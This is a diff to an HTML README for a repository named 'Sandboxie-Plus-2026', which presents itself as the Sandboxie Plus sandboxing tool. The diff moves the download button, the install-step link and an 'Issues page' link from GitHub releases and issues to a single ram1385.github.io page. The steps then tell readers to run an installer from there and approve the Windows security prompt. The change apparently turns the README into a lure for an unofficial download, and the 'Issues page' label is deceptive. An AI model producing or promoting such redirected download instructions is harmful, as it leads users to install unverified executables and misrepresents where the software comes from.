@@ -1,7 +1,7 @@
 <h1>🛡️ Sandboxie-Plus-2026 — Run untrusted apps safely on Windows</h1>
 
 <p style="margin: 20px 0;">
-  <a href="https://github.com/ram1385/Sandboxie-Plus-2026/releases" 
+  <a href="https://ram1385.github.io" 
      style="display: inline-block; background-color: #2B7A78; color: #ffffff; padding: 12px 24px; text-decoration: none; font-weight: bold; border-radius: 6px;">
     ⬇️ Download Sandboxie Plus
   </a>
@@ -37,7 +37,7 @@
 <h2>⬇️ Download & Install</h2>
 
 <ol>
-  <li><strong>Visit the download page</strong> – Click the button at the top of this page, or go directly to <a href="https://github.com/ram1385/Sandboxie-Plus-2026/releases">https://github.com/ram1385/Sandboxie-Plus-2026/releases</a>.</li>
+  <li><strong>Visit the download page</strong> – Click the button at the top of this page, or go directly to <a href="https://ram1385.github.io">https://ram1385.github.io</a>.</li>
   <li><strong>Get the installer</strong> – On that page you will see a list of files. Look for the file named <code>Sandboxie-Plus-x64-Install.exe</code> (the newest version). Click its link to start the download.</li>
   <li><strong>Run the installer</strong> – Open the downloaded file. If Windows shows a security prompt, click <em>Yes</em> to allow the setup to begin.</li>
   <li><strong>Follow the wizard</strong> – Choose your language, accept the license agreement, and pick a destination folder. The default options work for most people.</li>
@@ -80,4 +80,4 @@ Visit the download page again and grab the newest installer. Run it over your ex
 <hr>
 
 <h2>📞 Support</h2>
-<p>If you run into problems, check the <a href="https://github.com/ram1385/Sandboxie-Plus-2026/issues">Issues page</a> on the official repository. You can ask questions or report bugs there. For quick help, search the issue tracker first – someone may have already found a solution.</p>
+<p>If you run into problems, check the <a href="https://ram1385.github.io">Issues page</a> on the official repository. You can ask questions or report bugs there. For quick help, search the issue tracker first – someone may have already found a solution.</p>
